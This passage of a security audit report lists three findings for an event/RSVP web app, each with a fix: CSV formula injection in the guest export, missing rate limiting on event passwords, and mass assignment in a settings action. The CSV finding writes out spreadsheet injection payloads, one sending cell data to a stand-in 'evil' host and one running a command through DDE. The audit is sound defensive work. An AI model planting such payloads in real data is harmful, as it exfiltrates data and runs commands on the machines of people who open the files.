...
- **[SEC-16] CSV formula injection in guest export — `app/e/[slug]/guests.csv/route.ts` ~line 36**: The `esc()` helper only quote-doubles values; it does not neutralize leading `=`, `+`, `-`, `@`, tab, or CR. `guestName`/`guestEmail` are fully attacker-controlled (anyone who can RSVP), and CSV quoting does not stop spreadsheet formula evaluation — a guest named `=HYPERLINK("http://evil/?"&A1)` or `=cmd|'/c calc'!A1` executes/exfiltrates when the **host** opens the export in Excel/Sheets. Distinct from SEC-10 (which was co-host access to the CSV). Fix: prefix any cell beginning with `= + - @`, tab, or CR with a `'` (or `="..."`-neutralize) before quoting.
...
- **[SEC-19] No rate limiting on event-password verification — `app/actions/event.ts` ~line 26 (`verifyEventPassword`)**: Online brute-force of password-gated events. bcrypt (cost 10) slows it but there is no attempt cap/lockout. The `rateLimit()` helper (`lib/rateLimit.ts`) exists but is wired only into magic-link/register (`app/actions/auth.ts`). Fix: add `rateLimit("event-pw:<slug>:<ip>", …)` around the compare.
- **[SEC-20] Mass assignment in `saveEventSettings` — `app/actions/event.ts` ~line 480**: Unlike `addRSVP`/`addComment`, this action has no Zod schema — `const { password, ...rest } = settings; db.event.update({ data: { ...rest, … } })` spreads the raw client-supplied object straight into the update. Server actions do not enforce the TS type at runtime, so a crafted call can write arbitrary `Event` scalar columns (`status`, `slug`, `hostId`, …) on an event the caller hosts. Bounded to own events, but enables unintended state changes (e.g. set `status: "DELETED"`, grab another event's `slug`). Fix: validate `settings` with an explicit allow-list / Zod schema.
